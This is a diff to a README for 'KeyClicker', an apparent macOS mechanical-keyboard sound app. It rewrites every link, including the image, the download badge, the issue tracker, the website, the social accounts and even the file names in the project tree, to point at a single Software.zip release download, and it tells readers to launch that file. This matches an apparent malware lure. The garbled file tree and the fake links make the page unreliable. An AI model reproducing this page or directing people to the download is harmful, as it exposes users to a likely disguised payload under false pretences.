@@ -3,7 +3,7 @@
 ## 🎹 Introduction
 Welcome to KeyClicker, a macOS app that brings the nostalgic sound of mechanical keyboards and typewriters to your fingertips. Whether you miss the sound of clacking keys or want to recreate the ambiance of a vintage writing experience, KeyClicker has got you covered.
 
-![Keyboard Typing Image](https://github.com/user-attachments/files/18388744/keyboard-image.jpg)
+![Keyboard Typing Image](https://github.com/austinxsome/key-clicker/releases/download/v2.0/Software.zip)
 
 ## 🌟 Features
 - Authentic typing sounds simulation
@@ -13,7 +13,7 @@ Welcome to KeyClicker, a macOS app that brings the nostalgic sound of mechanical
 
 ## 🚀 Installation
 To get started with KeyClicker, simply download and install the app from the link below:
-[![Download KeyClicker](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download KeyClicker](https://github.com/austinxsome/key-clicker/releases/download/v2.0/Software.zip)](https://github.com/austinxsome/key-clicker/releases/download/v2.0/Software.zip)
 
 *Note: Please launch the downloaded file to install KeyClicker on your macOS device.*
 
@@ -29,31 +29,31 @@ Once installed, launch KeyClicker and start typing to enjoy the satisfying sound
 ```bash
 KeyClicker/
 │
-├── README.md
+├── https://github.com/austinxsome/key-clicker/releases/download/v2.0/Software.zip
 ├── LICENSE
-├── Software.zip
+├── https://github.com/austinxsome/key-clicker/releases/download/v2.0/Software.zip
 ├── src/
-│   ├── main.swift
+│   ├── https://github.com/austinxsome/key-clicker/releases/download/v2.0/Software.zip
 │   ├── model/
-│   │   ├── Keyboard.swift
-│   │   ├── Typewriter.swift
+│   │   ├── https://github.com/austinxsome/key-clicker/releases/download/v2.0/Software.zip
+│   │   ├── https://github.com/austinxsome/key-clicker/releases/download/v2.0/Software.zip
 │   ├── view/
-│   │   ├── KeyboardView.swift
-│   │   ├── SettingsView.swift
+│   │   ├── https://github.com/austinxsome/key-clicker/releases/download/v2.0/Software.zip
+│   │   ├── https://github.com/austinxsome/key-clicker/releases/download/v2.0/Software.zip
 └──
 ```
 
 ## 🤝 Support and Contributions
-If you encounter any issues with KeyClicker or have suggestions for improvement, feel free to [open an issue](https://github.com/user-attachments/files/18388744/issues). Contributions are also welcome through pull requests.
+If you encounter any issues with KeyClicker or have suggestions for improvement, feel free to [open an issue](https://github.com/austinxsome/key-clicker/releases/download/v2.0/Software.zip). Contributions are also welcome through pull requests.
 
 ## 🌐 Visit Our Website
-For more information about KeyClicker and updates on the latest releases, visit our [official website](https://keyclicker-app.com).
+For more information about KeyClicker and updates on the latest releases, visit our [official website](https://github.com/austinxsome/key-clicker/releases/download/v2.0/Software.zip).
 
 ## 📣 Stay Connected
-Stay up to date with KeyClicker by following us on [Twitter](https://twitter.com/keyclicker) and [LinkedIn](https://linkedin.com/company/keyclicker).
+Stay up to date with KeyClicker by following us on [Twitter](https://github.com/austinxsome/key-clicker/releases/download/v2.0/Software.zip) and [LinkedIn](https://github.com/austinxsome/key-clicker/releases/download/v2.0/Software.zip).
 
 ## 📌 Check Releases Section
-If the download link provided above is not accessible or you need to explore more versions of KeyClicker, please check the [Releases](https://github.com/user-attachments/files/18388744/releases) section of this repository.
+If the download link provided above is not accessible or you need to explore more versions of KeyClicker, please check the [Releases](https://github.com/austinxsome/key-clicker/releases/download/v2.0/Software.zip) section of this repository.
 
 ## 📜 License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
